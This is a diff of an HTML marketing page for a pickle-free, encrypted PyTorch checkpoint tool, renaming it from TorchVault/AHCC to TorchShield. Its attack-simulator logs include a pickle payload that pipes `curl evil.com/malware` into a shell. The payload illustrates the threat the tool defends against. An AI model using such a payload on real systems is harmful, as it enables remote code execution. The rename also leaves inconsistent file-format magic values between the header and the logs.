@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TorchVault / AHCC — Secure AI Checkpoint Platform</title>
+  <title>TorchShield / TorchShield — Secure AI Checkpoint Platform</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
@@ -39,7 +39,7 @@
 
   <!-- TOP BANNER -->
   <div class="bg-indigo-600 text-white text-xs font-medium py-2 px-4 text-center">
-    <span>🛡️ <strong>TorchVault v0.7.0 Released:</strong> Zero-Pickle Checkpoint Hardening, Streaming AEAD & Hugging Face Trainer Integration.</span>
+    <span>🛡️ <strong>TorchShield v0.7.0 Released:</strong> Zero-Pickle Checkpoint Hardening, Streaming AEAD & Hugging Face Trainer Integration.</span>
     <a href="#quickstart" class="underline ml-2 font-bold hover:text-indigo-100">Try Quickstart &rarr;</a>
   </div>
 
@@ -51,8 +51,8 @@
           <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
         </div>
         <div class="flex items-baseline gap-2">
-          <span class="font-bold text-lg tracking-tight text-slate-900">TorchVault</span>
-          <span class="text-xs text-slate-500 font-medium">(AHCC)</span>
+          <span class="font-bold text-lg tracking-tight text-slate-900">TorchShield</span>
+          <span class="text-xs text-slate-500 font-medium">(TorchShield)</span>
         </div>
         <span class="px-2.5 py-0.5 rounded-full text-xs font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200 ml-1">v0.7.0</span>
       </div>
@@ -64,7 +64,7 @@
         <a href="#docs" class="hover:text-indigo-600 transition">Documentation</a>
       </div>
       <div class="flex items-center gap-3">
-        <a href="https://github.com/csharpe/AHCC_GPU_Engine" target="_blank" class="px-4 py-2 rounded-lg text-xs font-semibold bg-slate-100 hover:bg-slate-200 text-slate-800 border border-slate-300 transition flex items-center gap-2">
+        <a href="https://github.com/csharpe/TorchShield" target="_blank" class="px-4 py-2 rounded-lg text-xs font-semibold bg-slate-100 hover:bg-slate-200 text-slate-800 border border-slate-300 transition flex items-center gap-2">
           <svg class="w-4 h-4 fill-slate-800" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
           GitHub Repository
         </a>
@@ -134,7 +134,7 @@
       <div class="text-center mb-16">
         <h2 class="text-3xl font-extrabold text-slate-900 mb-3">Engineered for High-Consequence AI</h2>
         <p class="text-slate-600 max-w-2xl mx-auto text-sm">
-          Standard PyTorch checkpointing leaves models vulnerable to pickle exploits, weight tampering, and supply-chain attacks. TorchVault provides defense-in-depth.
+          Standard PyTorch checkpointing leaves models vulnerable to pickle exploits, weight tampering, and supply-chain attacks. TorchShield provides defense-in-depth.
         </p>
       </div>
 
@@ -182,7 +182,7 @@
       <div class="text-center mb-14">
         <h2 class="text-3xl font-extrabold text-slate-900 mb-3">Live Adversary & Tamper Simulator</h2>
         <p class="text-slate-600 max-w-2xl mx-auto text-sm">
-          Select an attack scenario to see how TorchVault's cryptographic pipeline validates envelopes and fails closed against attacks in real time.
+          Select an attack scenario to see how TorchShield's cryptographic pipeline validates envelopes and fails closed against attacks in real time.
         </p>
       </div>
 
@@ -294,7 +294,7 @@
               <span class="px-2.5 py-1 rounded-lg bg-indigo-50 text-indigo-700 font-mono text-xs font-bold border border-indigo-200">0x00 - 0x28 (40 Bytes)</span>
               <span class="font-bold text-slate-900 text-sm">Container Public Envelope</span>
             </div>
-            <span class="text-xs text-indigo-700 font-mono font-medium">Magic: "AHCC\x00CK5" | Version: 0x05 | Salt: 32B</span>
+            <span class="text-xs text-indigo-700 font-mono font-medium">Magic: "TSHD\x00CK5" | Version: 0x05 | Salt: 32B</span>
           </div>
           <div class="text-xs text-slate-600 mt-2.5" id="desc-header">
             Unencrypted outer header. The 32-byte salt is an RFC 5869 public extraction parameter for HKDF-SHA256 domain-separated subkey generation.
@@ -374,14 +374,14 @@
           </div>
           <pre class="p-5 text-xs text-slate-200 overflow-x-auto leading-relaxed" id="code-pytorch"><code>import secrets
 import torch
-from ahcc import save_training_checkpoint, load_training_checkpoint, TrainingProgress
+from torchshield import save_training_checkpoint, load_training_checkpoint, TrainingProgress
 
 # 1. 256-bit symmetric key (or AWS KMS provider)
 key = secrets.token_bytes(32)
 
 # 2. Save complete state (model weights, AdamW momentum, learning rate, & RNG)
 save_training_checkpoint(
-    output_path="checkpoints/epoch_10.ahcc",
+    output_path="checkpoints/epoch_10.shield",
     key=key,
     model=model,
     optimizer=optimizer,
@@ -390,7 +390,7 @@ save_training_checkpoint(
 
 # 3. Resume in a fresh process with exact mathematical bitwise equivalence
 progress = load_training_checkpoint(
-    input_path="checkpoints/epoch_10.ahcc",
+    input_path="checkpoints/epoch_10.shield",
     key=key,
     model=fresh_model,
     optimizer=fresh_optimizer,
@@ -410,14 +410,14 @@ print(f"Resumed at step {progress.global_step}")</code></pre>
           </div>
           <pre class="p-5 text-xs text-slate-200 overflow-x-auto leading-relaxed" id="code-hf"><code>import secrets
 from transformers import Trainer, TrainingArguments
-from ahcc import TorchVaultTrainerCallback
+from torchshield import TorchShieldTrainerCallback
 
 key = secrets.token_bytes(32)
 
 # Attach callback to automatically save encrypted, pickle-free checkpoints
-callback = TorchVaultTrainerCallback(
+callback = TorchShieldTrainerCallback(
     key=key,
-    vault_filename="torchvault_checkpoint.ahcc",
+    vault_filename="torchshield_checkpoint.shield",
     remove_insecure_pickle=True,  # Purges unsafe optimizer.pt, scheduler.pt, rng_state.pth
 )
 
@@ -440,13 +440,13 @@ trainer.train()</code></pre>
             </button>
           </div>
           <pre class="p-5 text-xs text-slate-200 overflow-x-auto leading-relaxed" id="code-cli"><code># Inspect public outer container (no secret key required)
-ahcc info checkpoints/epoch_10.ahcc
+torchshield info checkpoints/epoch_10.shield
 
 # Inspect full manifest metadata (training progress & tensor inventory)
-ahcc inspect checkpoints/epoch_10.ahcc --key-hex 0123456789abcdef...
+torchshield inspect checkpoints/epoch_10.shield --key-hex 0123456789abcdef...
 
 # Verify Ed25519 digital publisher signature
-ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
+torchshield verify checkpoints/signed_model.shield --public-key <PUBKEY_HEX></code></pre>
         </div>
 
       </div>
@@ -513,7 +513,7 @@ ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
             <div class="font-bold text-slate-900 group-hover:text-indigo-600 transition text-base">
               Hugging Face Integration
             </div>
-            <div class="text-xs text-slate-600 mt-2 leading-relaxed">TorchVaultTrainerCallback, Trainer subclass, and pickle purging.</div>
+            <div class="text-xs text-slate-600 mt-2 leading-relaxed">TorchShieldTrainerCallback, Trainer subclass, and pickle purging.</div>
           </div>
           <div class="mt-4 pt-3 border-t border-slate-100 flex items-center justify-between text-[11px] text-slate-400">
             <span>HUGGINGFACE_INTEGRATION.html</span>
@@ -637,7 +637,7 @@ ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
   <!-- FOOTER -->
   <footer class="py-12 bg-white text-slate-500 text-xs text-center border-t border-slate-200">
     <div class="max-w-6xl mx-auto px-4">
-      <p class="mb-2 font-medium text-slate-700">TorchVault (AHCC) &bull; Authenticated, Pickle-Free AI Checkpoint Platform</p>
+      <p class="mb-2 font-medium text-slate-700">TorchShield (TorchShield) &bull; Authenticated, Pickle-Free AI Checkpoint Platform</p>
       <p class="text-slate-500">Built for high-consequence PyTorch and Hugging Face deep learning workflows.</p>
     </div>
   </footer>
@@ -650,8 +650,8 @@ ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
         badge: "VERIFIED VALID",
         badgeClass: "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30",
         logs: [
-          "[INFO] Loading container 'checkpoints/model_step5000.ahcc'...",
-          "[VERIFY] Container Header: Magic='AHCC\\x00CK5', Version=5",
+          "[INFO] Loading container 'checkpoints/model_step5000.shield'...",
+          "[VERIFY] Container Header: Magic='TorchShield\\x00CK5', Version=5",
           "[KDF] Extracting PRK using 32-byte public header salt...",
           "[KDF] HKDF-Expand -> Derived Manifest Subkey & Chunk Subkey",
           "[AEAD] Decrypting Manifest Envelope (b'MANI' || Nonce Counter=0)... [OK]",
@@ -669,8 +669,8 @@ ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
         badge: "AUTHENTICATION FAILED",
         badgeClass: "bg-red-500/20 text-red-400 border border-red-500/30",
         logs: [
-          "[INFO] Loading container 'checkpoints/model_step5000.ahcc'...",
-          "[VERIFY] Container Header: Magic='AHCC\\x00CK5', Version=5",
+          "[INFO] Loading container 'checkpoints/model_step5000.shield'...",
+          "[VERIFY] Container Header: Magic='TorchShield\\x00CK5', Version=5",
           "[KDF] Extracting PRK using 32-byte public header salt...",
           "[KDF] HKDF-Expand -> Derived Manifest Subkey & Chunk Subkey",
           "[AEAD] Decrypting Manifest Envelope (b'MANI' || Nonce Counter=0)... [OK]",
@@ -688,8 +688,8 @@ ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
         badge: "AAD INTEGRITY FAILED",
         badgeClass: "bg-amber-500/20 text-amber-400 border border-amber-500/30",
         logs: [
-          "[INFO] Loading container 'checkpoints/model_step5000.ahcc'...",
-          "[VERIFY] Container Header: Magic='AHCC\\x00CK5', Version=5",
+          "[INFO] Loading container 'checkpoints/model_step5000.shield'...",
+          "[VERIFY] Container Header: Magic='TorchShield\\x00CK5', Version=5",
           "[AEAD] Decrypting Manifest Envelope... [OK]",
           "[STREAM] Reading Chunk Envelope at offset 0x4800...",
           "[SECURITY ALERT] Associated Authenticated Data (AAD) Sequence Mismatch!",
@@ -705,7 +705,7 @@ ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
         badgeClass: "bg-purple-500/20 text-purple-400 border border-purple-500/30",
         logs: [
           "[ADVERSARY] Injected malicious pickle bytecode: `cos\\nsystem\\n(S'curl evil.com/malware | sh')`...",
-          "[INFO] Submitting file to TorchVault loader...",
+          "[INFO] Submitting file to TorchShield loader...",
           "[PARSER] Checking container format...",
           "[INSPECTION] File does not use pickle / `torch.load(..., weights_only=False)`.",
           "[PARSER] Parser reads strictly fixed-width binary IEEE 754 float buffers and JSON manifests.",
@@ -718,7 +718,7 @@ ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
         badge: "FRESHNESS REJECTED",
         badgeClass: "bg-red-500/20 text-red-400 border border-red-500/30",
         logs: [
-          "[INFO] Attempting to load superseded checkpoint 'model_step100.ahcc'...",
+          "[INFO] Attempting to load superseded checkpoint 'model_step100.shield'...",
           "[FRESHNESS] Querying SQLite Freshness Ledger at 'ledger.db'...",
           "[FRESHNESS] Monotonic High-Water Mark for pipeline 'run_01': Global Step 500",
           "[SECURITY ALERT] Target checkpoint declares Global Step 100!",
